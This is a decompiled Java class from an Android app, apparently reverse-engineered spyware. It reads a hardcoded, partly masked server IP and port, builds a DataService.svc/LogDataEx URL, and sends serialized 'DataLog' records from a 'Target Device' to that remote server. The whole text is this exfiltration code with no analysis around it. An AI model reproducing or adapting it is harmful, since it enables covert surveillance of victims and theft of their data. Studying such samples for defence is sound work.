package com.app.system.common.d.a;

import android.content.Context;
import android.content.SharedPreferences;
import com.android.system.CoreApp;
import com.app.system.common.entity.DataLog;
import com.app.system.common.g;
import com.app.system.common.h;
import com.google.gson.f;
import java.util.Date;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class a
{
  String a;
  boolean b;
  String c;
  
  public a(String paramString1, String paramString2)
  {
    try
    {
      if (g.a(CoreApp.a()))
      {
        this.b = true;
        com.security.d.a.d("ServerPro", "Target Device use Proxy", new Object[0]);
      }
      else
      {
        this.b = false;
        com.security.d.a.d("ServerPro", "Target Device do not use Proxy", new Object[0]);
      }
      paramString1 = CoreApp.a().getSharedPreferences("pref", 0);
      String str = paramString1.getString("DEST_SERVER_IP", "5.56.12.***"); /* TRUNCATED FOR PRIVACY */
      int i = paramString1.getInt("DEST_SERVER_PORT", 2224);
      if (paramString1.getBoolean("DEST_SERVER_SSL_ACTIVE", false)) {
        paramString1 = "https://";
      } else {
        paramString1 = "http://";
      }
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append(paramString1);
      localStringBuilder.append(str);
      localStringBuilder.append(":");
      localStringBuilder.append(i);
      this.c = localStringBuilder.toString();
      this.a = paramString2;
    }
    catch (Exception paramString1)
    {
      com.security.d.a.a("ServerPro", paramString1.getMessage(), new Object[0]);
    }
  }
  
  private void b(Context paramContext, DataLog paramDataLog) {}
  
  public int a(Context paramContext, DataLog paramDataLog)
  {
    try
    {
      String str = h.b().a(paramDataLog, DataLog.class);
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("sendLogDataToServer - ");
      localStringBuilder.append(str);
      com.security.d.a.d("ServerPro", localStringBuilder.toString(), new Object[0]);
      b(paramContext, paramDataLog);
      if (this.b)
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/DataService.svc");
        paramContext.append("/LogDataEx");
        paramContext.append("/");
        paramDataLog = new java/util/Date;
        paramDataLog.<init>();
        paramContext.append(paramDataLog.getTimezoneOffset());
        paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), str);
      }
      else
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/DataService.svc");
        paramContext.append("/LogDataEx");
        paramContext.append("/");
        paramDataLog = new java/util/Date;
        paramDataLog.<init>();
        paramContext.append(paramDataLog.getTimezoneOffset());
        paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), str);
      }
      if (paramContext == null) {
        return -10;
      }
      paramContext = paramContext.body().string();
      if ((!paramContext.equals("")) && (!paramContext.startsWith("0")) && (!paramContext.contains("<html")))
      {
        int i = Integer.parseInt(paramContext);
        return i;
      }
      return -20;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("ServerPro", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/a.class
 *
 * Reversed by:           J
 */